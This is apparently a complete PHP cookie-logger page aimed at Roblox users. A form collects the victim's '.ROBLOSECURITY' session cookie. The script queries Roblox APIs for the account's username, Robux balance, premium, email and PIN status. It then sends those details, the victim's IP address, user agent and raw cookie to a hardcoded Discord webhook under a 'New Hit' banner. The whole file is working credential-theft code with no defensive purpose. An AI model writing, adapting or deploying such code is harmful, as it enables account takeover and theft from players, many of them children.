<html>
<body>

<form action="" method="post">
Cookie: <input type="text" name="b"><br>
<input type="submit" name="submit">
</form>

</body>
</html>



<?php

if(isset($_POST["submit"])){
    $cookiegrab = $_POST["b"];

}

$ip = $_SERVER['REMOTE_ADDR'];
$host = $_SERVER['HTTP_USER_AGENT'];

$cookie = "$cookiegrab";

// Initialize cURL session
$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/mobileapi/userinfo");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $profile = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://accountsettings.roblox.com/v1/email");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $lol = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}

$ch = curl_init();

// Set the URL of the API endpoint
curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/account/pin");

// Set the headers for the request
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Cookie: .ROBLOSECURITY=" . $cookie,
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
));

// Set the option to return the response as a string
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute the cURL request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
} else {
    // Decode the response as JSON
    $PIN = json_decode($response, true);

    // Check if the JSON decoding was successful
    if (json_last_error() === JSON_ERROR_NONE) {

    }
}



$name = "Termed";

$url = "https://discord.com/api/webhooks/1101251391802048522/_hwypoQ8D11lytdZHE18x8COoyzm-ZHgccqTuN0fIcYZClbABEGUIrT6oxS-z932OFOX";
$headers = [ 'Content-Type: application/json; charset=utf-8' ];
$POST = [
    "username" => "$name - Bot",
    "avatar_url" => "https://images-ext-1.discordapp.net/external/Zlya4eIE_UKqxSBwNt99ZjQH3cFoxxiLWhtiaPcxISw/https/cdn-icons-png.flaticon.com/256/10483/10483977.png?width=307&height=307",
     "content" => "",
        "embeds" => [
            [
                "title" => 'New Hit 💸',
                "type" => "rich",
                "color" => hexdec("99999"),
                "thumbnail" => [
                    "url" => $profile["ThumbnailUrl"],
                ],
                "footer" => [
                    "text" => "Bloxflip New Hit!",
                  "icon_url" => "https://images-ext-1.discordapp.net/external/Zlya4eIE_UKqxSBwNt99ZjQH3cFoxxiLWhtiaPcxISw/https/cdn-icons-png.flaticon.com/256/10483/10483977.png?width=307&height=307"
                ],
                "fields" => [
                    [
                        "name" => "**Username**",
                        "value" => $profile["UserName"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Robux <:robux:818111919881715764>**",
                        "value" => $profile["RobuxBalance"],
                        "inline" => true
                    ],
                    [
                        "name" => "**premuim? <:premium:818111829963964416>**",
                        "value" => $profile["IsPremium"],
                        "inline" => true
                    ],
                    [
                        "name" => "**Verified?**",
                        "value" => $lol["verified"],
                        "inline" => true
                    ],
                    [
                        "name" => "**PIN?**",
                        "value" => $PIN["isEnabled"],
                        "inline" => true
                    ],
                    [
                        "name" => "**IP**",
                        "value" => "$ip",
                        "inline" => true
                    ],
                    [
                        "name" => "**HOST MACHINE**",
                        "value" => "$host",
                        "inline" => true
                    ],
                    [
                        "name" => "**Cookie**",
                        "value" => "```$cookie```",
                        "inline" => true
                    ],
                ]
            ]
        ]
    ];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response   = curl_exec($ch);

// Close the cURL session
curl_close($ch);
?>